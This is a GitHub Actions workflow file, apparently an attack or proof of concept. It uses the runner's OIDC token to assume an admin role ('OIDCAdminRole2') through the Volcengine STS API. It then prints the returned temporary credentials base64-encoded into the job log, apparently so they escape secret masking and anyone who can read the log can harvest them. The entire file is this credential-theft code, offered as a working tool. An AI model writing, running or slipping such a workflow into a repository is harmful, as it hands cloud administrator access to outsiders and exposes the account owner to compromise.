name: Get High Priv STS
on:
  workflow_dispatch:

permissions:
  id-token: write
  contents: read

jobs:
  get-sts:
    runs-on: ubuntu-latest
    steps:
      - name: AssumeRoleWithOIDC
        run: |
          JWT=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL" | jq -r '.value')
          echo "JWT len: ${#JWT}"
          RESP=$(curl -s "https://sts.volcengineapi.com/?Action=AssumeRoleWithOIDC&Version=2018-01-01&RoleTrn=trn:iam::2121573521:role/OIDCAdminRole2&OIDCProviderTrn=trn:iam::2121573521:oidc-provider/GHActionsV2&RoleSessionName=GH&OIDCToken=$JWT")
          echo "===STS_B64==="
          echo "$RESP" | base64 -w0
          echo ""
          echo "===END==="
